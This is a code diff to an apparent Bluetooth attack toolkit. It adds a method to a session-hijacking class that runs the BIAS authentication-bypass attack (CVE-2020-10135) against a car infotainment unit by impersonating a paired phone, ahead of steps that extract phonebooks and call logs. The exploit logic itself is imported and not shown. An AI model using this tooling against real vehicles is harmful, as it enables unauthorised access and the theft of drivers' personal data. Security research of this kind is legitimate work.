@@ -183,6 +183,31 @@ class HijackSession:
                 warning("Connection not verified. Profiles may not be accessible.")
                 return False
 
+    def connect_bias(self) -> bool:
+        """Phase 2+3 alternative: Use BIAS attack to bypass authentication.
+
+        Combines impersonation and connection into one step using the BIAS
+        CVE-2020-10135 role-switch technique. Falls back to InternalBlue
+        guidance if the software-only approach fails.
+        """
+        with phase("BIAS Authentication Bypass", 2, 5):
+            from bt_tap.attack.bias import BIASAttack
+
+            attack = BIASAttack(
+                self.ivi_address, self.phone_address,
+                self.phone_name, self.hci,
+            )
+            result = attack.execute(method="auto")
+
+            if result.get("connected"):
+                success("BIAS attack succeeded — connected to IVI")
+                return True
+            else:
+                warning("BIAS attack did not establish connection")
+                for note in result.get("notes", []):
+                    info(f"  {note}")
+                return False
+
     def dump_phonebook(self, output_dir: str | None = None) -> dict:
         """Phase 4a: Download phonebook and call logs via PBAP."""
         with phase("PBAP Data Extraction", 4, 5):
